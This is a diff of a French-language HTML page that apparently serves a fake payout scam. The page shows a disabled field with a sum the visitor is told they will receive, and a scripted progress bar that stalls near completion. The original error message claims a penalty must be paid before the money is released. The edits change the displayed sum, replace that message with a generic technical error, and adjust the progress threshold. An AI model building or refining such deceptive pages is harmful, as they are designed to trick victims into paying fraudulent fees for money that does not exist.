@@ -148,7 +148,7 @@
 
             <div class="form-group">
                 <label for="amount">Montant à recevoir</label>
-                <input type="text" id="amount" class="amount" value="4 200 $" disabled>
+                <input type="text" id="amount" class="amount" value="5 049 $" disabled>
             </div>
 
             <button type="button" onclick="startProgress()">Procéder</button>
@@ -160,7 +160,7 @@
                 <div class="progress-bar" id="progressBar"></div>
             </div>
 
-            <div class="notification-message" id="notificationMessage">Erreur : Une pénalité a été appliquée à votre compte. Veuillez la régler pour pouvoir recevoir la somme de 4 200 $..</div>
+            <div class="notification-message" id="notificationMessage">Erreur : Erreur technique.</div>
         </form>
     </div>
 
@@ -188,7 +188,7 @@
             const progressPercentage = document.getElementById('progressPercentage');
             
             const interval = setInterval(() => {
-                if (progress < 99) {
+                if (progress < 99.98) {
                     progress += 1;
                     progressBar.style.width = progress + '%';
                     progressPercentage.textContent = progress + '%';
